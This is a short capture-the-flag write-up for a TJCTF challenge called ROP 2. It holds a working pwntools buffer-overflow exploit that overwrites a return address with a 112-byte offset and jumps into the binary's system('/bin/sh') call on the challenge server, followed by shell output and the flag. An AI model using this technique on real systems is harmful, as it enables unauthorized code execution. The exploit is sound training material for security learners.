### Solved by superkojiman

This is similar to ROP 1 in that we want to return to the give_shell() function to get our shell. Much like ROP 1, the offset to overwrite the saved return pointer in the name() function is 112 bytes. Returning directly to give_shell() won't get us a shell due to some checks that it makes. To get around it, just return to 0x08048568 in give_shell(), which sets up the call to system():


```python
#!/usr/bin/env python 
from pwn import *

# address of start of system("/bin/sh"):
#   0x8048568 <give_shell+51>:   mov    DWORD PTR [esp],0x8048710
#   0x804856f <give_shell+58>:   call   0x80483e0 <system@plt>
give_shell = p32(0x08048568) 

buf = ""
buf += "A"*112 + give_shell

r = remote("p.tjctf.org", 8093)
print r.recv()
r.send(buf + "\n");
r.interactive()
```

Run it to get a shell on the target: 

```text
koji@pwnbox32:~/Desktop/rop-2/dock$ ./sploit.py 
[+] Opening connection to p.tjctf.org on port 8093: Done
Enter your name 
[*] Switching to interactive mode
$ id
uid=1000(app) gid=1000(app) groups=1000(app)
$ ls
Dockerfile
etc
flag
prog
rop2
wrapper
$ cat flag
does_this_really_count_as_programming
```

The flag is: does_this_really_count_as_programming
